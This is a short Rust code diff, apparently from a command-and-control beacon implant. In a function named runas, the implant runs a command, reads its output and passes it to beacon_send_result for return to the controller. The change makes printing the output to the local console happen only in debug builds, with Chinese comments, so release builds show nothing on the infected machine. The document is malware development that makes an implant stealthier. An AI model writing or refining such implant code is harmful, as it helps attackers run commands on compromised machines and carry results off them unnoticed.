@@ -406,7 +406,10 @@ pub fn runas(mut decrypted_cursor: Cursor<Vec<u8>>) {
         }
 
         let output = String::from_utf8_lossy(&buffer[..bytes_read as usize]);
-        println!("Command output: {}", output);
+        // 仅在 debug 模式下打印
+        if cfg!(debug_assertions) {
+            println!("Command output: {}", output);
+        }
         beacon_send_result(output.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
 
         // 清理句柄
